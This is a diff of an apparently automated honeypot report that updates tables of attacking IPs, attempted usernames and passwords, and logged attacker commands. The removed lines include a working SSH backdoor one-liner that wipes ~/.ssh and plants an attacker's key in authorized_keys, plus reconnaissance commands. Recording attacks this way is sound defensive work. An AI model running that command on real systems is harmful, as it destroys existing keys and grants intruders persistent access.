@@ -13,58 +13,49 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 47.94.139.51 | 4498 |
-| 47.74.213.140 | 4224 |
-| 39.108.36.206 | 3887 |
-| 121.43.189.23 | 3777 |
-| 60.205.56.230 | 1480 |
-| 47.243.116.26 | 508 |
-| 157.245.215.150 | 493 |
-| 170.64.217.119 | 396 |
-| 101.36.119.124 | 159 |
-| 182.92.129.250 | 159 |
+| 8.153.36.169 | 4906 |
+| 8.219.99.214 | 4587 |
+| 47.237.7.29 | 4193 |
+| 60.205.56.230 | 3155 |
+| 170.64.217.189 | 1637 |
+| 157.245.215.150 | 986 |
+| 121.43.189.23 | 928 |
+| 8.222.181.107 | 602 |
+| 170.64.217.119 | 536 |
+| 8.217.83.38 | 504 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 2588 |
-| ubuntu | 31 |
-| user | 30 |
-| admin | 29 |
-| postgres | 18 |
-| test | 13 |
-| git | 12 |
-| ftpuser | 9 |
-| near | 9 |
-| usuario2 | 9 |
+| root | 2804 |
+| user | 44 |
+| ubuntu | 43 |
+| admin | 35 |
+| oracle | 28 |
+| validator | 19 |
+| node | 15 |
+| ansible_user | 14 |
+| mysql | 14 |
+| near | 14 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 182 |
-| 123456Dd | 132 |
-| 1234 | 23 |
-| P@ssw0rd | 16 |
-| root | 15 |
-| password | 14 |
-| 12345678 | 12 |
-| sebastian123 | 11 |
-| near | 9 |
-| adminadmin | 9 |
+| 123456 | 222 |
+| 123456Dd | 67 |
+| Admin@2024 | 42 |
+| admin2025 | 41 |
+| 12345678 | 38 |
+| password | 36 |
+| root | 30 |
+| 123 | 24 |
+| 12345 | 19 |
+| admin | 18 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 101.36.119.124 | uname -s -m |
-| 103.234.151.178 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 103.234.151.178 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 103.234.151.178 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 186.10.125.209 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 186.10.125.209 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 186.10.125.209 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 182.92.237.4 | uname -s -m |
-| 182.92.129.250 | uname -s -m |
-| 182.92.210.172 | uname -s -m |
+| 103.229.125.228 | uname -s -m |
